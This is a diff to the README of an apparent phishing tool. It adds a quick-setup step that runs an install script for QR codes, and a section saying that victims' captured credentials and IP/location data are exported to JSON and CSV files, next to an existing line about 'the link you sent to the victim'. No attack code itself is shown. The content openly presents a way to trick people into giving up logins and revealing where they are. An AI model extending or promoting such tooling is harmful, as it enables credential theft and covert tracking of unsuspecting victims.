@@ -92,7 +92,22 @@ Share the link that was generated :D
 
 # Result
 
+## Added feature: quick enhanced setup
+Install the enhanced dependencies (for QR codes):
+
+```bash
+chmod +x install_enhanced.sh
+./install_enhanced.sh
+```
+
+## Added feature: export captured data
+Captured credentials and IP/location data are exported to:
+- `capture_data.json`
+- `capture_data.csv`
+- `url_analytics.json`
+
 - The link you sent to the victim:
+
 
 ![chrome-NQpwa-Yi-Wxc.png](https://i.postimg.cc/mrxzN5JH/chrome-NQpwa-Yi-Wxc.png)
 
